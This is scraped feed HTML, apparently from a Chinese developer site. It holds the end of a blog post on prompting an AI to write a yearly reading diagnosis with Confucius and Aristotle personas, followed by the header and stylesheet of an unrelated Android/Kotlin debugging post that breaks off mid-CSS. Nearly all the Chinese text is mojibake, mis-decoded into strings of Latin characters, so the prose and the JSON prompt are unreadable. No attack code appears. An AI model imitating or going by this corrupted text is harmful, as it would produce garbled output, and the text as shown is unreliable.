    <span class="hljs-attr">"step_4_philosophical_review"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æ¨¡æ‹Ÿå­”å­ä¸äºšé‡Œå£«å¤šå¾·çš„æ€ç»´æ–¹å¼ï¼Œå¯¹ç”¨æˆ·çš„ç²¾ç¥çŠ¶æ€è¿›è¡Œé«˜ç»´ç‚¹è¯„ã€‚"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"step_5_synthesis"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ç”Ÿæˆå¹´åº¦åˆ¤è¯ä¸ä¹¦å•ã€‚"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"output_structure"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"format"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Markdown"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"sections"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"intro"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ğŸ¯ æ ¸å¿ƒå®šè°ƒï¼šå¹´åº¦å…³é”®è¯"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"..."</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"macro_analysis"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ğŸ›ï¸ å®è§‚æ•°æ®ç”»åƒ"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"..."</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"timeline_analysis"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ğŸ§  æ—¶é—´è½´å¿ƒç†ä¾§å†™"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"..."</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"deep_insight"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ğŸ” æ·±åº¦å¥½ç©å„¿çš„æ´å¯Ÿ"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"..."</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"philosophical_dialogue"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ğŸ“œ è·¨æ—¶ç©ºæ–°å¹´å¯„è¯­ï¼šåœ£è´¤çš„å®¡è§†"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"confucius"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æ‰®æ¼”å­”å­ã€‚å…³æ³¨'å­¦ä¸æ€'çš„å…³ç³»ã€ä¿®èº«å…»æ€§ã€ä»¥åŠè¯»ä¹¦æ˜¯å¦ä¸ºäº†'ä»'ã€‚ç”¨åŠæ–‡åŠç™½çš„è¯­è°ƒï¼Œç‚¹è¯„ç”¨æˆ·çš„é˜…è¯»ç„¦è™‘ä¸åŠŸåˆ©æ€§ï¼Œå¹¶ç»™å‡ºå›å­ä¹‹é“çš„å»ºè®®ã€‚"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"aristotle"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æ‰®æ¼”äºšé‡Œå£«å¤šå¾·ã€‚å…³æ³¨'ç†æ€§'ã€'ä¸­é“'ä¸'å¹¸ç¦(Eudaimonia)'ã€‚ç‚¹è¯„ç”¨æˆ·çš„çŸ¥è¯†åˆ†ç±»ï¼ˆç‰©ç†/æ–‡å­¦/å•†ä¸šï¼‰ï¼Œè®¨è®ºè¿™ç§é˜…è¯»æ–¹å¼æ˜¯å¦èƒ½è¾¾æˆäººç±»çš„ç»ˆæç›®çš„ï¼Œå¼ºè°ƒç†æ€§ä¸æ„Ÿæ€§çš„å¹³è¡¡ã€‚"</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"conclusion_recommendation"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ğŸ’¡ å¹´åº¦æ€»è¯„ä¸æ¯’èˆŒå»ºè®®"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"..."</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>AI ä¼šå…¨æ–¹é¢è¯Šæ–­ï¼Œç„¶åç»™å‡ºè¯¦ç»†çš„æŠ¥å‘Šã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fd49b20af1f45a5b99f07e837d5a91e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-k5pe255qE6aOO562d:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767659622&amp;x-signature=7FRpGxL3ATzURvrI%2FsFOYC4PdDo%3D" alt="" loading="lazy"/></p>
<p>è¿˜å¯ä»¥è®©AIç»™å‡ºä¸€ä»½è¯¦ç»†çš„2026å¹´ä¹¦å•ã€‚</p>
<p>æˆ‘çš„æŠ¥å‘Šä¸€å‡ºæ¥ï¼ŒAIè¯´æˆ‘è¿™ä¸€å¹´æ˜¯åšäº†ä¸€ä¸ªâ€œå®å¤§çš„çƒ‚å°¾å·¥ç¨‹â€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3dc8f7a2ee2346d09e056646e7ae9510~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-k5pe255qE6aOO562d:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767659622&amp;x-signature=r1kkbh%2FzK4s6unRGS5rFvTY1iHk%3D" alt="" loading="lazy"/></p>
<p><strong>å­”å­å’Œäºšé‡Œå£«å¤šå¾·ä¹Ÿç»™äº†æˆ‘è¯šæ³çš„å¿ å‘Šï¼Œå­”å¤«å­åŠæˆ‘â€œéŸ¦ç¼–ä¸‰ç»â€ï¼Œä¸å¿…è´ªå¤šã€‚</strong></p>
<p><strong>äºšé‡Œå£«å¤šå¾·è®©æˆ‘å»é‡Šæ”¾æ¿€æƒ…ï¼Œåˆ‡èº«ä½“ä¼šã€‚</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec5878a154df426b8b73d1cdc3f4308c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-k5pe255qE6aOO562d:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767659622&amp;x-signature=uRpPUye3q73dkk22ZKdfKkF9nF0%3D" alt="" loading="lazy"/></p>
<p>AIç»™æˆ‘çš„å¹´åº¦åˆ¤è¯æ˜¯ï¼š</p>
<blockquote>
<p>ä¸€ä¸ªç”¨ç†æ€§é“ ç”²æŠŠè‡ªå·±æ­¦è£…åˆ°ç‰™é½¿ï¼Œå´åœ¨æ·±å¤œé€šè¿‡æ–‡å­¦ä½œå“å·å·æµæ³ªçš„çŸ›ç›¾ç»¼åˆä½“ã€‚ä½ è¯•å›¾çœ‹é€è¿™ä¸ªä¸–ç•Œçš„åº•ç‰Œï¼ˆç‰©ç†ã€å†å²ã€è„‘ç§‘å­¦ï¼‰ï¼Œå´ä¾ç„¶è¢«è¿™ä¸–ç•Œæœ€æœ´ç´ çš„æƒ…æ„Ÿï¼ˆç”Ÿæ­»ã€äººç”Ÿï¼‰æ‰€ç‰µç»Šã€‚</p>
</blockquote>
<p>å¦å¤–ï¼Œ<strong>è¿˜å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªæç¤ºè¯ï¼Œå°†æŠ¥å‘Šåšæˆä¸€ä»½å¯è§†åŒ–çš„ç½‘é¡µã€‚</strong></p>
<blockquote>
<p>å°†ä»¥ä¸Š2025å¹´åº¦é˜…è¯»è¯Šæ–­æŠ¥å‘Šåšæˆä¸€ä¸ªå’ŒæŠ¥å‘Šä¸€ä¸€å¯¹åº”çš„ã€è¯¦ç»†çš„å¯è§†åŒ–ç½‘é¡µåˆ†ææŠ¥å‘Šï¼Œä¸€ä¸€å±•ç°ï¼Œä¸è¦é—æ¼</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bdbb3a4fb7744285ba2ddc773c8f27da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-k5pe255qE6aOO562d:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767659622&amp;x-signature=SIhP14YaRd9f6N%2BvP8JfE5QGh2k%3D" alt="" loading="lazy"/></p>
<p><strong>è‹æ ¼æ‹‰åº•ç•™ä¸‹çš„åƒå¤éš¾é¢˜ï¼šâ€œè®¤è¯†ä½ è‡ªå·±â€ã€‚</strong></p>
<p>æˆ‘ä»¬æ›¾è¯•å›¾é€šè¿‡é˜…è¯»ã€æ—…è¡Œå’Œç”Ÿæ´»å»æ‹¼å‡‘ç­”æ¡ˆã€‚</p>
<p>è€Œç°åœ¨ï¼Œæœ‰äº†AI ï¼Œå¯ä»¥ç«™åœ¨å…¨çŸ¥çš„æ—è§‚è€…è§’åº¦ï¼Œå¸®æˆ‘ä»¬æŒ–æ˜æ›´æ·±å±‚çš„è‡ªå·±ï¼Œè™½ç„¶ä¸å¯èƒ½å®Œå…¨æ­£ç¡®ã€‚</p>
<p>å½“ä½ çœ‹ç€è¿™ä»½æŠ¥å‘Šï¼Œçœ‹ç€é‚£ä¸ªè¢«AIåˆ»ç”»çš„â€œä¸€éƒ¨åˆ†è‡ªå·±â€ï¼Œå¯èƒ½ä½ æ²‰ç¡å·²ä¹…çš„æŸä¸ªéƒ¨åˆ†ä¼šè¢«çªç„¶å‡»ä¸­ï¼Œç”šè‡³è¢«ç‚¹äº®ã€‚</p>
<p>å»è¯•è¯•å§ï¼Œä¹Ÿè®¸ä½ ä¼šå’Œæˆ‘ä¸€æ ·ï¼Œåœ¨å±å¹•å‰æƒŠå‘¼ï¼šåŸæ¥å¦‚æ­¤ï¼åˆæˆ–è€…ä¸å±‘åœ°è¯´ï¼šä»€ä¹ˆç©æ„ï¼</p>
<p>ä¸é‡è¦äº†ã€‚</p>
<p><strong>è¿˜å¯ä»¥çœ‹çœ‹é£ç­å¾€æœŸæ–‡ç« </strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzAxMjA0MDk2OA%3D%3D%26mid%3D2449474176%26idx%3D1%26sn%3D6b14e61551641921e3ad9fb17b6dcde0%26chksm%3D8c434ce7bb34c5f1f8aad31bb537aed5ba068773583ec17020770a919b75462f0aa1dc21a5ab%26token%3D1083800749%26lang%3Dzh_CN%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzAxMjA0MDk2OA==&amp;mid=2449474176&amp;idx=1&amp;sn=6b14e61551641921e3ad9fb17b6dcde0&amp;chksm=8c434ce7bb34c5f1f8aad31bb537aed5ba068773583ec17020770a919b75462f0aa1dc21a5ab&amp;token=1083800749&amp;lang=zh_CN#rd" ref="nofollow noopener noreferrer">ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå…è´¹ã€æ— é™æœŸä½¿ç”¨ SSL(HTTPS)è¯ä¹¦ï¼Œä»æ­¤å®ç°è¯ä¹¦è‡ªç”±äº†</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F4cJ3g1GlenQJ9UifyXH0Kg" target="_blank" title="https://mp.weixin.qq.com/s/4cJ3g1GlenQJ9UifyXH0Kg" ref="nofollow noopener noreferrer">ä¸ºä»€ä¹ˆæˆ‘æ¯å¤©éƒ½è®°ç¬”è®°ï¼Œä¸»è¦æ˜¯å› ä¸ºæˆ‘ç”¨çš„è¿™ä¸ªç¬”è®°è½¯ä»¶å¤ªå¼ºå¤§äº†ï¼Œå¼ºçƒˆå»ºè®®ä½ ä¹Ÿç”¨èµ·æ¥</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzAxMjA0MDk2OA%3D%3D%26mid%3D2449472490%26idx%3D1%26sn%3Dda10b436d1f8123149316dac76a618aa%26chksm%3D8fbcb58db8cb3c9ba481b7d095966abb86ff7d1a45a771aad191991db65cd6e384a557a40ec4%26token%3D1977984185%26lang%3Dzh_CN%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzAxMjA0MDk2OA==&amp;mid=2449472490&amp;idx=1&amp;sn=da10b436d1f8123149316dac76a618aa&amp;chksm=8fbcb58db8cb3c9ba481b7d095966abb86ff7d1a45a771aad191991db65cd6e384a557a40ec4&amp;token=1977984185&amp;lang=zh_CN#rd" ref="nofollow noopener noreferrer">ã€Œå·®ç”Ÿæ–‡å…·å¤šç³»åˆ—ã€æœ€å¥½çœ‹çš„ç¼–ç¨‹å­—ä½“</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzAxMjA0MDk2OA%3D%3D%26mid%3D2449473008%26idx%3D1%26sn%3Dc8f8d9c9675571ea1a42c13b1af9b6e7%26chksm%3D8fbcb397b8cb3a81f3c6c55eb398c0599128f18b9bbdae87965cd40ef519dad3394649426d1e%26token%3D1044263965%26lang%3Dzh_CN%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzAxMjA0MDk2OA==&amp;mid=2449473008&amp;idx=1&amp;sn=c8f8d9c9675571ea1a42c13b1af9b6e7&amp;chksm=8fbcb397b8cb3a81f3c6c55eb398c0599128f18b9bbdae87965cd40ef519dad3394649426d1e&amp;token=1044263965&amp;lang=zh_CN#rd" ref="nofollow noopener noreferrer">æˆ‘æ‚£ä¸Šäº†ç©ºæŒ‡é’ˆåé—ç—‡</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzAxMjA0MDk2OA%3D%3D%26mid%3D2449473057%26idx%3D1%26sn%3D2170397d6bab5ad0a6d6427f77584df2%26chksm%3D8fbcb046b8cb3950d1784fe29bc7776cb0c71868acba36a47d60b41bc8a60959303082b0ee2a%26token%3D1977984185%26lang%3Dzh_CN%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzAxMjA0MDk2OA==&amp;mid=2449473057&amp;idx=1&amp;sn=2170397d6bab5ad0a6d6427f77584df2&amp;chksm=8fbcb046b8cb3950d1784fe29bc7776cb0c71868acba36a47d60b41bc8a60959303082b0ee2a&amp;token=1977984185&amp;lang=zh_CN#rd" ref="nofollow noopener noreferrer">ä¸€åƒä¸ªå¾®æœåŠ¡ä¹‹æ­»</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzAxMjA0MDk2OA%3D%3D%26mid%3D2449472966%26idx%3D1%26sn%3Da272a9df52ae18cc9a6163732b37c5d8%26chksm%3D8fbcb3a1b8cb3ab7857a88adc8a2e6d28bb6f2316df501f5f8e6fc487794f3b34f77829b4b94%26token%3D1977984185%26lang%3Dzh_CN%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzAxMjA0MDk2OA==&amp;mid=2449472966&amp;idx=1&amp;sn=a272a9df52ae18cc9a6163732b37c5d8&amp;chksm=8fbcb3a1b8cb3ab7857a88adc8a2e6d28bb6f2316df501f5f8e6fc487794f3b34f77829b4b94&amp;token=1977984185&amp;lang=zh_CN#rd" ref="nofollow noopener noreferrer">æ­å»ºé™æ€ç½‘ç«™ç«Ÿç„¶æœ‰è¿™ä¹ˆå¤šæ–¹æ¡ˆï¼Œè€Œä¸”è¿˜å¦‚æ­¤ç®€å•</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzAxMjA0MDk2OA%3D%3D%26mid%3D2449472616%26idx%3D1%26sn%3Da41a420933f9af7f88af0759eb75f815%26chksm%3D8fbcb20fb8cb3b1969433e2468523234552562e504f3a12c8c1a2a012cff7fd1422e6dd48723%26token%3D1977984185%26lang%3Dzh_CN%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzAxMjA0MDk2OA==&amp;mid=2449472616&amp;idx=1&amp;sn=a41a420933f9af7f88af0759eb75f815&amp;chksm=8fbcb20fb8cb3b1969433e2468523234552562e504f3a12c8c1a2a012cff7fd1422e6dd48723&amp;token=1977984185&amp;lang=zh_CN#rd" ref="nofollow noopener noreferrer">è¢«äººè¯´ Lambda ä»£ç åƒå±å±±ï¼Œé‚£æ˜¯æ²¡ç”¨ä¸‹é¢è¿™ä¸‰ä¸ªæ–¹æ³•</a></p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‡Œæ™¨ä¸¤ç‚¹ç£¨é”‹èŠ’ è°ƒè¯•é‡‡å‘è«æ…Œå¼ ]]></title>    <link>https://juejin.cn/post/7589170021931892751</link>    <guid>https://juejin.cn/post/7589170021931892751</guid>    <pubDate>2025-12-30T00:30:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589170021931892751" data-draft-id="7589126217250848809" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‡Œæ™¨ä¸¤ç‚¹ç£¨é”‹èŠ’ è°ƒè¯•é‡‡å‘è«æ…Œå¼ "/> <meta itemprop="keywords" content="Android,Kotlin"/> <meta itemprop="datePublished" content="2025-12-30T00:30:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‡Œæ™¨ä¸¤ç‚¹ç£¨é”‹èŠ’ è°ƒè¯•é‡‡å‘è«æ…Œå¼ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T00:30:12.000Z" title="Tue Dec 30 2025 00:30:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»18åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"â€¢";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body 